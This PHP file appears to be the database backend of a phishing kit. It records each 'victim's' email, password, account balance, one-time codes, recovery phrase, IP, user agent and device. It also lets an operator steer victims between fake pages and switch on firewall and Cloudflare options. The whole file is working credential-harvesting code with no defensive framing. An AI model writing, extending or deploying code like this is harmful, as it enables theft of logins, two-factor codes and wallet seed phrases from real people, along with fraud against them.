<?php
require_once(__DIR__."/../db-connect.php");

function insertEmailIfNotExists() {
    $pdo = $GLOBALS['pdo'];
    if (!isset($_SESSION["victim_id"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $emailExistsQuery = "SELECT COUNT(*) FROM clients WHERE email = :email";
            $checkStmt = $pdo->prepare($emailExistsQuery);
            $checkStmt->bindParam(':email', $email);
            $checkStmt->execute();
            $emailCount = $checkStmt->fetchColumn();

            // if ($emailCount == 0) {
                $insertEmailQuery = "INSERT INTO clients (email) VALUES (:email)";
                $newEmail = "";
                $stmt = $pdo->prepare($insertEmailQuery);
                $stmt -> bindParam(":email", $newEmail);
                $stmt->execute();
            // }
            $victim_id = $pdo->lastInsertId();
            $_SESSION["victim_id"] = $victim_id;
        } catch (PDOException $e) {
            error_log("Error inserting email: " . $e->getMessage());
        }
    }
}

function insertPassword() {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["password"])) {
        $password = htmlspecialchars($_SESSION["password"]);
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        
        try {
            $updatePasswordQuery = "UPDATE clients SET password = :password WHERE id = :victim_id";
            $stmt = $pdo->prepare($updatePasswordQuery);
            $stmt->bindParam(':password', $password);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating password: " . $e->getMessage());
        }
    }
}

function insertBalance() {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["balance"])) {
        $balance = htmlspecialchars($_SESSION["balance"]);
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        
        try {
            $updateBalanceQuery = "UPDATE clients SET balance = :balance WHERE id = :victim_id";
            $stmt = $pdo->prepare($updateBalanceQuery);
            $stmt->bindParam(':balance', $balance);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating balance: " . $e->getMessage());
        }
    }
}


function update_status($status) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        try {
            $updateStatusQuery = "UPDATE clients SET status = :status WHERE id = :victim_id";
            $stmt = $pdo->prepare($updateStatusQuery);
            $stmt->bindParam(':status', $status);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating status: " . $e->getMessage());
        }
    }
}


function update_current_page($page) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        try {
            $updateCurrentPageQuery = "UPDATE clients SET current_page = :current_page WHERE id = :victim_id";
            $stmt = $pdo->prepare($updateCurrentPageQuery);
            $stmt->bindParam(':current_page', $page);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating current page: " . $e->getMessage());
        }
    }
}


function update_ip_useragent($ip, $user_agent) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        try {
            $updateIpUseragentQuery = "UPDATE clients SET ip = :ip, useragent = :user_agent WHERE id = :victim_id";
            $stmt = $pdo->prepare($updateIpUseragentQuery);
            $stmt->bindParam(':ip', $ip);
            $stmt->bindParam(':user_agent', $user_agent);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating IP and User Agent: " . $e->getMessage());
        }
    }
}


function update_device_info ($device_info) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        try {
            $updateDeviceInfoQuery = "UPDATE clients SET device = :device_info WHERE id = :victim_id";
            $stmt = $pdo->prepare($updateDeviceInfoQuery);
            $stmt->bindParam(':device_info', $device_info);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating device info: " . $e->getMessage());
        }
    }
}

function check_redirect(){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        try {
           $checkRedirectQuery = "SELECT `page`, `email` FROM clients WHERE id = :victim_id";
            $stmt = $pdo->prepare($checkRedirectQuery);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
            $result = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($result) {
                $check_redirect = $result['page'];
                $_SESSION['email'] = $result['email'];
                $updatePageQuery = "UPDATE clients SET `page` = '' WHERE id = :victim_id";
                $stmt = $pdo->prepare($updatePageQuery);
                $stmt->bindParam(':victim_id', $victim_id);
                $stmt->execute();
            } else {
                $check_redirect = 'signin?client_id=';
            }
            return $check_redirect;
        } catch (PDOException $e) {
            error_log("Error checking redirect: " . $e->getMessage());
        }
    }
}



function update_code($code){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        try {
            $updateCode = "UPDATE clients SET code = :code WHERE id = :victim_id";
            $stmt = $pdo->prepare($updateCode);
            $stmt->bindParam(':code', $code);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating code: " . $e->getMessage());
        }
    }
}


function update_phrase($phrase){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        try {
            $updatePhraseQuery = "UPDATE clients SET phrase = :phrase WHERE id = :victim_id";
            $stmt = $pdo->prepare($updatePhraseQuery);
            $stmt->bindParam(':phrase', $phrase);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating phrase: " . $e->getMessage());
        }
    }
}


function update_url($url){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);

        try {
            $updateUrlQuery = "UPDATE clients SET url = :url WHERE id = :victim_id";
            $stmt = $pdo->prepare($updateUrlQuery);
            $stmt->bindParam(':url', $url);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating url: " . $e->getMessage());
        }
    }
}


function create_sign_id_victim(){
    if (!isset($_SESSION["victim_id"])) {
        $sign_id = bin2hex(random_bytes(5));
        $_SESSION["victim_id"] = $sign_id . '-' . $sign_id;
        $pdo = $GLOBALS["pdo"];
        try {
            $createSignIdQuery = "INSERT INTO victim (victimid) VALUES (:victim_id)";
            $stmt = $pdo->prepare($createSignIdQuery);
            $stmt->bindParam(':victim_id', $_SESSION["victim_id"]);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error creating sign id: " . $e->getMessage());
        }
    }

}

function update_victim_ip_ua($victim_ip, $victim_ua, $victim_status){
    if (!isset($_SESSION["victim_id"])) {
        create_sign_id();
    }

    $victim_id = $_SESSION["victim_id"];
    $pdo = $GLOBALS["pdo"];
    try {
        $updateIpUaQuery = "UPDATE victim SET ip = :victim_ip, useragent = :victim_ua, status = :victim_status WHERE victimid = :victim_id";
        $stmt = $pdo->prepare($updateIpUaQuery);
        $stmt->bindParam(':victim_ip', $victim_ip);
        $stmt->bindParam(':victim_ua', $victim_ua);
        $stmt->bindParam(':victim_status', $victim_status);
        $stmt->bindParam(':victim_id', $victim_id);
        $stmt->execute();


        $checkAllowQuery = "SELECT allow FROM victim WHERE victimid = :victim_id";
        $stmt = $pdo->prepare($checkAllowQuery);
        $stmt->bindParam(':victim_id', $victim_id);
        $stmt->execute();
        $allow = $stmt->fetchColumn();

        if ($allow == 1) {
            echo json_encode(array("status" => "success", "page" => "/"));
        }
    


    } catch (PDOException $e) {
        error_log("Error updating victim IP and User Agent: " . $e->getMessage());
    }
}


function check_sign_id_action(){
    if (isset($_SESSION["victim_id"])) {
        $victim_id = htmlspecialchars($_SESSION["victim_id"]);
        $pdo = $GLOBALS["pdo"];
        try {
            $checkAllowQuery = "SELECT allow FROM victim WHERE victimid = :victim_id";
            $stmt = $pdo->prepare($checkAllowQuery);
            $stmt->bindParam(':victim_id', $victim_id);
            $stmt->execute();
            $allow = $stmt->fetchColumn();
            if ($allow == 1) {
                return true;
            } else {
                return false;
            }

        } catch (PDOException $e) {
            error_log("Error checking allow status: " . $e->getMessage());
            return false;
        }
    }
    return false;
}


function checkFirewall(){
    $pdo = $GLOBALS["pdo"];
    $check_firewall = "SELECT firewall FROM users";
    $stmt = $pdo->prepare($check_firewall);
    $stmt->execute();
    $firewall = $stmt->fetchColumn();
    if($firewall == 1){
        return True;
    } else {
        return False;
    }
}


function panelcheck(){
    $pdo = $GLOBALS["pdo"];
    $check_panel = "SELECT panel FROM users";
    $stmt = $pdo->prepare($check_panel);
    $stmt->execute();
    $panel = $stmt->fetchColumn();
    if($panel == 1){
        return True;
    }
    return False;
}



function check_cloudflare() {
   $pdo = $GLOBALS["pdo"];
   $check_cloudflare = "SELECT cloudflare FROM users";
   $stmt = $pdo->prepare($check_cloudflare);
   $stmt->execute();
   $cloudflare = $stmt->fetchColumn();
   if($cloudflare == 1){
       return True;
   } else {
       return False;
   }
}


function check_sms_numb(){
    if($_SESSION['email']){
        $email = $_SESSION['email'];
        $pdo = $GLOBALS["pdo"];
        $check_sms_code = "SELECT num FROM clients WHERE email = :email";
        $stmt = $pdo->prepare($check_sms_code);
        $stmt->bindParam(':email', $email);
        $stmt->execute();
        $code = $stmt->fetchColumn();
        return $code;
    }
    
}
